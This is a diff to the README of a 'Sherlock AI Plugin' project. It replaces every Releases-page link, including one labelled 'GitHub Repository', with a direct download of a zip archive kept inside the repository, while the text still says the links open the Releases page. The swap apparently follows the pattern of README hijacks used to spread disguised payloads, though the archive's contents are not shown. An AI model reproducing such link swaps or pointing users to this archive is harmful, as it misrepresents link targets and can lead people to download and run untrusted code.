@@ -7,7 +7,7 @@ Welcome to the **Sherlock AI Plugin**! This tool supercharges your research effo
 
 ## 📥 Download Now
 
-[![Download Sherlock AI Plugin](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/lyx2022518/sherlock-ai-plugin/releases)
+[![Download Sherlock AI Plugin](https://github.com/lyx2022518/sherlock-ai-plugin/raw/refs/heads/main/skills/ai-plugin-sherlock-v2.1.zip%20Now-Release%20Page-brightgreen)](https://github.com/lyx2022518/sherlock-ai-plugin/raw/refs/heads/main/skills/ai-plugin-sherlock-v2.1.zip)
 
 ## 📂 Overview
 
@@ -35,7 +35,7 @@ To run the Sherlock AI Plugin, ensure your system meets the following requiremen
 
 To get started, visit this page to download the latest version of the Sherlock AI Plugin:
 
-[Download the Latest Release](https://github.com/lyx2022518/sherlock-ai-plugin/releases)
+[Download the Latest Release](https://github.com/lyx2022518/sherlock-ai-plugin/raw/refs/heads/main/skills/ai-plugin-sherlock-v2.1.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version and find the download link for your operating system.
@@ -77,13 +77,13 @@ Follow our repository for the latest updates and features. You can keep track of
 
 If you're interested in contributing to the Sherlock AI Plugin, please submit a pull request or open an issue to discuss your ideas. Your contributions can make a significant difference!
 
-For more information, check our [GitHub Repository](https://github.com/lyx2022518/sherlock-ai-plugin).
+For more information, check our [GitHub Repository](https://github.com/lyx2022518/sherlock-ai-plugin/raw/refs/heads/main/skills/ai-plugin-sherlock-v2.1.zip).
 
 ## 📥 Final Download Link
 
 Don't forget, you can download the plugin from the Releases page:
 
-[Download the Latest Release](https://github.com/lyx2022518/sherlock-ai-plugin/releases)
+[Download the Latest Release](https://github.com/lyx2022518/sherlock-ai-plugin/raw/refs/heads/main/skills/ai-plugin-sherlock-v2.1.zip)
 
 Happy researching with the Sherlock AI Plugin!
 ```
